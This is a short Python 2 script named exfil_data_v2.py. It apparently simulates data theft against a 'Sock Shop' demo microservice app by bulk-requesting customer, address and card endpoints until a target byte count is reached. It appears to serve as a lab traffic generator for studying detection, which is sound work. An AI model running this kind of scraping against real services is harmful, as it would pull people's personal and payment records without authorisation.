import time
import base64
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession

'''
USAGE: python exfil_data_v2.py [addr of sock shop]
note: 
'''

# amt is the amt to exfiltrate within one 5 sec period.
def exfiltrate_data():
    cur_time = time.time()
    amt_exfil = 0
    data_exfiltrated = []
    
    # use the big calls to do as much of the exfil as possible
    while (amt - amt_exfil)  / amt_customers >= 1:
        exfil_data = requests.get(addr + "/customers/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    while (amt - amt_exfil)  / amt_addresses >= 1:
        exfil_data = requests.get(addr + "/addresses/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    while (amt - amt_exfil)  / amt_cards >= 1:
        exfil_data = requests.get(addr + "/cards/")
        amt_exfil  = amt_exfil + len(exfil_data.content)

    # finish the rest with smaller calls
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=20))
    base64string = base64.encodestring('%s:%s' % ('user', 'password')).replace('\n', '')
    login = requests.get(addr + "/login", headers={"Authorization":"Basic %s" % base64string})
    while amt_exfil < int(amt):
        exfil_data_fut = session.get(addr + "/customers/azc", cookies=login.cookies)
        exfil_data_fut_1 = session.get(addr + "/customers/frc", cookies=login.cookies)
        exfil_data_fut_2 = session.get(addr + "/customers/vpp", cookies=login.cookies)
        exfil_data_fut_3 = session.get(addr + "/customers/add", cookies=login.cookies)
        exfil_data_fut_4 = session.get(addr + "/customers/rep", cookies=login.cookies)
        exfil_data = exfil_data_fut.result()
        exfil_data_1 = exfil_data_fut_1.result()
        exfil_data_2 = exfil_data_fut_2.result()
        exfil_data_3 = exfil_data_fut_3.result()
        exfil_data_4 = exfil_data_fut_4.result()
        #print exfil_data.text
        amt_exfil = amt_exfil + len(exfil_data.content) + len(exfil_data_1.content) + len(exfil_data_2.content)
        amt_exfil = amt_exfil + len(exfil_data_3.content) + len(exfil_data_4.content)
        #print len(exfil_data.content), amt_exfil
    print "that took: ", time.time() - cur_time, " seconds" 

# how much data is extracted via each call API call?
def how_much_data(minikube_addr):
    customers = requests.get(minikube_addr + "/customers/")
    addresses = requests.get(minikube_addr + "/addresses/")
    cards = requests.get(minikube_addr + "/cards/")

    return len(customers.content), len(addresses.content), len(cards.content)

if __name__=="__main__":
    if len(sys.argv) < 1:
        print "triggered"
    addr= sys.argv[1]
    amt = int(sys.argv[2])

    # so the appriorate sizes of the various api calls should be passed in, but if not we can use estimates
    amt_customers = 734589
    amt_addresses = 174940
    amt_cards = 48446
    #amt_customer = # this isn't actually needed
    if len(sys.argv) >= 5:
        amt_customers = int(sys.argv[3])
        amt_addresses = int(sys.argv[4])
        amt_cards = int(sys.argv[5])
    #    amt_customer = sys.argv[6] 
    exfiltrate_data()
